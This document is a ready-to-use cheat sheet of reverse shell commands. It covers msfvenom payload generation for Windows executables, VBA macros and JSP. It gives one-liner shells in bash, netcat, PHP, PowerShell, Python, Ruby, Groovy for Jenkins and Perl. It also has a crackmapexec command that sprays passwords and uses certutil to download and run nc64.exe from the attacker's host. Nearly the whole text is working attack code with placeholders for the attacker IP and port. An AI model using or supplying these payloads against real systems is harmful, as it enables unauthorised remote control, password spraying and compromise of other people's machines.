% rev shells cheats

$ port: echo '9001 443 80 1234 4444 32000' | tr ' ' '\n'
$ adapters: ip a | grep -P '^\d*:' | grep -v 'veth\|br-\|lo\|docker' | cut -d ' ' -f 2 | tr -d ':' | cut -d '@' -f 1
$ IP: (ip a | grep -P '^\d*:' | grep -v 'veth\|br-\|lo\|docker' | cut -d ' ' -f 2 | tr -d ':' | cut -d '@' -f 1; ip a | grep -P '^\d*:' | grep -v 'veth\|vnet\|br-\|lo\|docker' | cut -d ':' -f 2 | cut -d '@' -f 1 | while read line; do ip a s $line | grep -oE '\b((25[0-5]|2[0-4][0-9]|1?[0-9]{1,2})\.){3}(25[0-5]|2[0-4][0-9]|1?[0-9]{1,2})\b' ; done)



# x86 normal
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f exe

# x64 (CMD Single Stage)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe

# reverse HTTP
msfvenom -p windows/meterpreter/reverse_http LHOST=<IP> LPORT=<port> -f exe 

# reverse HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<port> -f exe 

# Powershell Payload
msfvenom -p cmd/windows/reverse_powershell LHOST=<IP> LPORT=<port>

# Macro Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f vba

# JSP rev shell (msfvenom)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f raw

# Bash RevShell
bash -i >& /dev/tcp/<IP>/<port> 0>&1

# Netcat OpenBsd RevShell [nc-mkfifo]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <port> >/tmp/f

# Minimal PHP Rev Shell
php -r '$sock=fsockopen("<IP>",<port>);exec("/bin/bash -i <&3 >&3 2>&3");'

# nc plain Rev Shell
nc -e /bin/bash <IP> <port>

# Windows PowerShell RevShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>",<port>); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2  = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};$client.Close()

# Python Rev Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# Ruby Rev Shell
ruby -rsocket -e'f=TCPSocket.open("<IP>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# crackmapexec (windows specific) download nc64.exe from your (tun0 port 80, webserver, revshell on port 443) box and execute it.
cme smb <target> -u <user-list> -d <target> -p <pass-list> -X "certutil.exe -urlcache -split -f http://<IP>/nc64.exe nc64.exe; .\nc64.exe <IP> 443 -e powershell.exe";   

# Jenkins Rev Shell [Groovy Script]
String host=<IP>;int port=<port>;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Perl Rev Shell
perl -e 'use Socket;$i="<IP>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("<shell> -i");};'

